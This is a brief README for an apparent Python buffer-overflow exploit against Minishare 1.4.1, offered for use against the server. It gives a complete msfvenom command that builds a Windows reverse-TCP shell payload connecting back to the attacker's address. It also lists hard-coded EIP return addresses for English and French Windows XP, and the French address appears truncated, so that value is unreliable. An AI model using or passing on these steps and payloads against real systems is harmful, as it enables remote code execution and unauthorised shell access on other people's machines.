# minishare_1_4_1_bof

This is a python based buffer overflow for Minishare 1.4.1

Incredibly simple, address and port need to be put in manually, and a msfvenom needs be generated with your IP addess.

msfvenom -p windows/shell_reverse_tcp LHOST=<local ip> LPORT=<local port> -f python -a x86 --platform windows -b '\x00\x0d' -f c

Included are the EIP's for a couple Windows XP versions. Both should work, but if they don't you'll have to find new ones in a debugger.

Windows XP-English: 7C9D30D7
Windows XP-French: 7C9E320

I plan on making a more robust automated version in the future.
